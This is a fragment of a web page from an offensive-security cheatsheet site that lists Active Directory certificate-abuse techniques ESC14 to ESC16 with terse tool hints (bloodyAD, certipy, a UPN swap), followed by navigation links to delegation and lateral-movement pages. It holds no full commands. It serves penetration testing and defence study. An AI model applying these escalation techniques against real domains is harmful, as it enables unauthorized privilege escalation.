group</td></tr><tr><td>ESC14</td><td>Write altSecurityIdentities</td><td>bloodyAD set + certipy auth</td></tr><tr><td>ESC15</td><td>EKUwu Schema V1</td><td><code>-application-policies</code></td></tr><tr><td>ESC16</td><td>CA globally no-SID-ext</td><td>UPN swap on any auth template</td></tr></tbody></table></div><nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href=/cheatsheets/active-directory/ad08-delegation/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Previous</span>
+<span class=cheatsheet-pager-title>Delegation</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+</span></a><a class="cheatsheet-pager-link is-next" href=/cheatsheets/active-directory/ad10-lateral-movement/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Next</span>
+<span class=cheatsheet-pager-title>Lateral Movement</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg></span></a></nav></div></div></article></main><button class=scroll-top-button type=button data-scroll-top aria-label="Scroll to top" aria-hidden=true tabindex=-1>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 18V6"/><path d="M6.75 11.25 12 6l5.25 5.25"/></svg></button><footer class=site-footer><p>&copy; 2026 JinPwn</p></footer></body></html>
